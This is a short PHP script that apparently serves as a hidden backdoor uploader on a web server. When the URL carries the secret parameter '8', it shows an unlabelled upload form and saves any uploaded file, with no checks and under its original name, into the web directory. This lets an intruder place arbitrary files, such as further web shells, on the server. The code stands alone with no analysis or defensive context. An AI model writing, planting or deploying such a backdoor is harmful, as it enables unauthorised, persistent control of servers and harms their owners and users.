<?php
if
(isset
($_GET['8']))
{
echo "<h2></h2><hr>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\"></label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br /><br />
<input type=\"submit\" name=\"default\" value=\"Upload\">
</form>";

{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "Rand(100-100): " . "" . $_FILES["file"]["name"];
echo"<hr>";
}
}
?>